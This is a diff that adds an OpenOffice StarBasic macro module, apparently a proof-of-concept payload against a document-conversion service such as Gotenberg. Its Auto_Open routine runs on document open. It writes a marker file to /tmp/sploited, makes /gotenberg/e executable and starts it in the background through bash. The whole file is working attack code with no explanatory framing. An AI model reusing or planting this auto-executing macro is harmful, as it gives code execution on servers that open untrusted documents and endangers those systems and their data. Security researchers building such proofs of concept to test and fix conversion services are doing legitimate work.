@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****
+
+Sub Auto_Open()
+Open &quot;/tmp/sploited&quot; For Output As #1
+   Print #1, &quot;AAAAA&quot;
+Close #1
+Shell(&quot;chmod +x /gotenberg/e&quot;)
+Shell(&quot;bash -c &apos;(set -m exec; /gotenberg/e &amp;)&apos;&quot;)
+End Sub
+</script:module>
